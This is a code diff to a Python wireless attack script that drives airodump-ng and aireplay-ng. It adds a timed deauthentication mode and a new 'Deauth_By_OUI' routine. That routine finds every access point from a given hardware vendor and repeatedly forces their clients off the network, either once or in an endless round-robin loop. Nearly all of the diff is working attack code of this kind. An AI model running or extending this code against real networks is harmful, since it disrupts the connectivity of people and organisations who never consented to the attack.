@@ -4,6 +4,7 @@ import signal
 import subprocess
 import time
 import re
+import keyboard
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 
 def clear():
@@ -110,7 +111,7 @@ def get_BSSID_and_Station_from_AP(interface, targetAP):
     airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                 preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     # kill airodump after 10 seconds
-    time.sleep(5)
+    time.sleep(15)
     clear()
     os.killpg(airodump.pid, signal.SIGTERM)
     # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGTERM)' is successful.
@@ -165,7 +166,7 @@ def get_BSSID_and_Station_from_AP(interface, targetAP):
                 return targetAP_BSSID, targetAP_channel
     return
 
-def Deauth(interface, targetAP):
+def Deauth(interface, targetAP, interval=False):
 
     """
     CALLS:
@@ -174,8 +175,11 @@ def Deauth(interface, targetAP):
 
     CALLED BY: main.py
 
+
     :param interface:
     :param targetAP:
+    :param interval: by default aireplay runs until user closes it. if interval == true then it will run for 60 seconds then quit
+        this option is needed for functions that loop multiple SSIDs in order to Deauth them all (for example : Deauth_By_OUI)
     :return:
     """
     try:
@@ -184,11 +188,31 @@ def Deauth(interface, targetAP):
         switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
         switch_channel.wait()
 
-        # run aireplay in seperate terminal
-        for terminal in terminals:
-            aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True)
-            aireplay.wait()
-            return
+
+
+        if interval: # if another function wants to run deauth attack but for a limited time
+            for terminal in terminals:       # run aireplay in seperate terminal
+                clear()
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True)
+                interval_time = 60
+                while interval_time > 0:
+                    print(f"Deauthenticating {ansi_escape_green(targetAP)}. Remanining time {ansi_escape_green(interval_time)} Press Q to cancel")
+                    if keyboard.is_pressed('q'):
+                        print("Loop canceled by user.")
+                        interval_time = 1
+                    time.sleep(1)
+                    interval_time-=1
+                try:
+                    os.killpg(aireplay.pid, signal.SIGTERM) # kill the aireplay and return after 60 seconds
+                except ProcessLookupError: # sometimes aireplay gets killed randomly with this try catch once we get an error while trying to kill a process thats already killed the script will still continue to run
+                    print('''ssssssssss''')
+                    print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {ansi_escape_red(ProcessLookupError)}")
+                return
+        else:
+            for terminal in terminals:
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True)
+                aireplay.wait() # wait until user closes the aireplay terminal
+                return
 
     except TypeError:
         print('==================================================================================================\n')
@@ -212,7 +236,7 @@ def get_devices_in_AP_output(interface, targetAP):
         targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
         airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',
                                     shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(10)
+        time.sleep(15)
         clear()
         os.killpg(airodump.pid, signal.SIGTERM)
         output, error = airodump.communicate()
@@ -274,7 +298,6 @@ def deauth_selected_device(interface, target_device, targetAP):
         switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
         switch_channel.wait()
 
-
         # run aireplay in seperate terminal
         for terminal in terminals:
             aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} -c {target_device} {interface}',shell=True)
@@ -304,7 +327,7 @@ def get_airodump_output(interface):
     print('Airodump is running. Wait a while for it to complete')
     airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                 preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(10)
+    time.sleep(15)
     clear()
     os.killpg(airodump.pid, signal.SIGTERM)
     output,error = airodump.communicate()
@@ -404,15 +427,43 @@ def get_SSID_from_OUI(output, targetOUI):
 def Deauth_By_OUI(interface, targetOUI):
     oui_output = get_airodump_output_OUI_formatted(interface)
     oui_output = remove_ansi_escape_codes(oui_output)
-    print(    get_SSID_from_OUI(oui_output, targetOUI))
+    SSIDs_in_oui_output = get_SSID_from_OUI(oui_output, targetOUI)
+    if SSIDs_in_oui_output:
+        print(f"List of SSIDs in {targetOUI}")
+        for SSID in SSIDs_in_oui_output:
+            print(f"{ansi_escape_green(SSID)}")
+        print("=====================================",
+              " 1   : Deauth all devices once and quit",
+              " 2   : Deauth all devices roundrobin",
+              " 999 : Quit")
+        while 1:
+            selection = input("Choose an option : ")
+            if selection == '999':
+                return
+            elif selection == '1':
+                for SSID in SSIDs_in_oui_output:
+                    Deauth(interface,SSID,interval=True)
+                return
+            elif selection == '2':
+                rr_counter = 0
+                while 1: #todo find a better alternative for this loop
+                    for SSID in SSIDs_in_oui_output:
+                        clear()
+                        print(f"Deauthing {SSID}")
+                        Deauth(interface, SSID,interval=True)
 
-        # print('==================================================================================================\n')
-        # print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
-        # print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
-        # input(f'input anything to return to previous function \n')
-    # Selection
-    # 1) Deauth all devices once and quit
-    # 2) Deauth all devices roundrobin
+
+                    rr_counter+=1
+                    print(f"each SSID in {ansi_escape_green(targetOUI)} has been Deauthenticated for {ansi_escape_green(rr_counter)} times")
+                    print(f"moving to round {ansi_escape_green(rr_counter+1)} in 3 seconds. Press 'q' to cancel the loop")
+                    if keyboard.is_pressed('q'):
+                        print("Loop canceled by user.")
+                        return
+                    time.sleep(3)
+
+    else:
+        print(f"No SSID found in f{targetOUI}")
+
     return
 
 
